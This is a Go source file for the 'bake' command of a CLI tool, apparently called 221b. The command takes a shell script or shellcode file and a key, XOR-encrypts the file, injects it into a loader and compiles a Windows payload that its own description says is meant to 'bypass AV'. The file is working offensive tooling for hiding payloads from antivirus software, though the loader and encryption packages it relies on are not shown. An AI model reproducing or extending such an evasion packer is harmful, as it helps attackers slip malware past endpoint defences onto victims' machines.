package cli

import (
	"fmt"
	"github.com/spf13/cobra"
	"os"

	"github.com/cmepw/221b/encryption"
	"github.com/cmepw/221b/loader"
	"github.com/cmepw/221b/logger"
)

var (
	shellpath string
	key       string
)

var (
	ErrMissingShellpath = fmt.Errorf("missing shellpath argument")
	ErrMissingKey       = fmt.Errorf("missing key argument")
)

var bake = &cobra.Command{
	Use:   "bake",
	Short: "Build a windows payload with the given shell encrypted in it to bypass AV",
	Run: func(cmd *cobra.Command, args []string) {
		if shellpath == "" {
			logger.Fatal(ErrMissingShellpath)
		}

		if key == "" {
			logger.Fatal(ErrMissingKey)
		}

		logger.Debug(fmt.Sprintf("baking %s with key %s", shellpath, key))

		logger.Debug(fmt.Sprintf("reading %s", shellpath))
		file, err := os.ReadFile(shellpath)
		if err != nil {
			logger.Fatal(err)
		}

		logger.Debug(fmt.Sprintf("encrypting %s", shellpath))
		encryptedShell := encryption.Xor.Encrypt(file, []byte(key))

		logger.Debug(fmt.Sprintf("injecting encrypted shell into payload"))

		xorLoader := loader.NewXorLoader([]byte(key))
		content, err := xorLoader.Load(encryptedShell)
		if err != nil {
			logger.Fatal(err)
		}

		if logger.DebugMode {
			logger.Debug("content")
			fmt.Println(string(content))
		}

		if err := xorLoader.Compile(shellpath, content); err != nil {
			logger.Fatal(err)
		}
	},
}

func init() {
	bake.Flags().StringVarP(&shellpath, "shellpath", "s", "", "Path to the shell scrypt")
	bake.Flags().StringVarP(&key, "key", "k", "", "key to use for the xor")
}
